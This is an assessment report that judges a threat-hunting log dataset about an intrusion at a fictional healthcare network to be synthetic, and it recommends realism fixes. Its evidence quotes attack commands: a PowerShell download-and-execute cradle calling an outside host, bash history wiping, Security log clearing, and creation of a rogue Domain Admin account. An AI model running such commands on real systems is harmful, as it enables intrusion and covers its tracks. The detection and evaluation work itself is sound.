# Threat Hunter - Authenticity Assessment

## Verdict

**Assessment:** Synthetic
**Confidence:** 78

## Executive Summary

The dataset is high-quality and the attack storyline is coherent across Windows, Linux, eCAR, and Zeek sources, but several source-native Linux process artifacts look generated from command templates rather than observed execution. The strongest tells are eCAR process records that preserve shell quoting and shell builtins in ways real endpoint telemetry normally would not.

## Evidence For Synthetic

- `APP-INT-01.meridianhcs.local/ecar.json:1013` logs `history -c && cat /dev/null > ~/.bash_history` as a `PROCESS/CREATE` with `image_path=/bin/bash` and parent `/bin/bash`; unless invoked as `bash -c`, this should not appear as a new bash process, and the `cat` portion would be a separate executable.
- Multiple Linux eCAR command lines preserve quoted tildes, e.g. `find '~/Downloads'` and `tail -50 '~/.xsession-errors'` in `APP-INT-01.meridianhcs.local/ecar.json:280`, `:393`, `:944`, `:999`. Real exec telemetry would usually see expanded paths, or the literal quoted-tilde command would fail and look odd as routine activity.
- Bash histories show repeated command-pool behavior: exact commands such as `bluetoothctl devices 2>/dev/null | head`, `tail -50 ~/.xsession-errors 2>/dev/null`, `lsusb 2>/dev/null | head`, and `journalctl --since '10 min ago' --no-pager -n 20` recur six times across different users and hosts, including production-looking servers such as DB and proxy systems.
- The attack naming is somewhat training-scenario-clean: `svc_mhsync`, `DeviceSyncSvc`, `cache_7f3a.zip`, `rpt_0318.sql.gz`, and `api.westbridge-services.net` all form a readable narrative with little ambiguity.

## Evidence For Real

- The Windows intrusion sequence is internally plausible: PSEXESVC service creation on DC at `2024-03-18T15:59:44Z`, domain account creation at `16:14:49Z`, Domain Admins addition at `16:14:51Z`, persistence via `DeviceSyncSvc` at `16:20:26Z`, and Security log clear event `1102` after `wevtutil cl Security`.
- Cross-source timing is convincing: DC `powershell.exe -EncodedCommand` at `17:41:45Z` decodes to `IEX (New-Object Net.WebClient).DownloadString("https://api.westbridge-services.net/v2/manifest")`, and Zeek proxy logs show matching CONNECT traffic to `api.westbridge-services.net` at `17:41:46Z`.
- The DB exfil chain is coherent: `DB-PROD-01` root bash history shows `mysqldump`, `gzip`, and `scp` at `17:15-17:18Z`; eCAR records the file creation and `scp`; Zeek records SSH from `10.10.4.10` to `10.10.2.30` at `17:18:45Z`.
- Background activity has useful mess: Windows Update, Defender, Google Drive, Zscaler, OCSP, NXDOMAINs, DHCP, proxy 407s, S0 scan noise, sysstat cron, and routine Kerberos/SMB/LDAP all appear around the attack.

## Detailed Analysis

The apparent environment spans workstations, a DC, file server, internal app server, proxy, external web server, and DB server. The main collection window is `2024-03-18T12:00:00Z` to about `18:00:00Z`, with some APP-INT eCAR and bash history extending later.

The attack storyline starts from `aisha.johnson`/`10.10.1.35` and moves to DC via PsExec. On `DC-01`, Security and Sysmon agree on `PSEXESVC.exe`, then `net user svc_mhsync MhsSvc!2024 /add /domain` at `16:14:48Z`, followed by `net group "Domain Admins" svc_mhsync /add /domain` at `16:14:50Z`. That is very huntable and source-native enough to follow.

Persistence and C2 are also coherent. `DeviceSyncSvc` is created and run from `C:\Windows\System32\DeviceSyncSvc.exe`; later outbound proxy activity from `10.10.2.10` to `api.westbridge-services.net` appears repeatedly. The encoded PowerShell at `17:41:45Z` lines up with proxy CONNECT telemetry using `PowerShell/5.1` as the user agent.

The file-server access by `svc_mhsync` is plausible: `FILE-SRV-01.meridianhcs.local/ecar.json:1864-1867` shows login, `net view`, and `Compress-Archive` into `C:\ProgramData\Microsoft\cache_7f3a.zip`. This feels like a realistic operator objective.

The weakest area is Linux host telemetry. The root DB dump and APP-INT receipt form a believable exfil path, but several ordinary Linux process records look like command-history strings converted into process events. The quoted-tilde examples and the `history -c && cat /dev/null > ~/.bash_history` `/bin/bash` record are the clearest authenticity breaks.

## Realism Score by Category

- **Field format accuracy:** 7 - Windows and Zeek fields are strong; Linux eCAR command-line semantics are the main weakness.
- **Temporal patterns:** 7 - Attack timing and beacon jitter are plausible, but repeated command-pool behavior weakens human realism.
- **Cross-source correlation:** 8 - Major pivots are well supported across host and network sources without obvious impossible ordering.
- **Behavioral realism:** 6 - Kill chain is plausible, but some operator and admin command histories feel templated.
- **Environmental consistency:** 7 - Topology and services hold together, with some odd desktop-oriented Linux commands on servers.

## Recommendations

- **P0:** Fix Linux eCAR process semantics for shell builtins, redirection, pipes, and `~` expansion. Do not emit `history -c && ...` as `/bin/bash` unless the command is explicitly `bash -c`, and make command lines look like exec argv or real EDR-rendered shell telemetry.
- **P1:** Reduce exact repeated bash command templates across users and hosts; avoid desktop-oriented commands like Bluetooth/X session checks on production servers unless the host role supports them.
- **P2:** Add or explain payload staging for `C:\Windows\System32\DeviceSyncSvc.exe`; the service is created and executed, but the binary arrival is less visible than the rest of the chain.
- **P3:** Add more benign dead ends and partial pivots so the attack narrative is less linear.
- **P4:** Vary benign user-agent and command vocabulary further, especially around routine proxy and Linux admin activity.
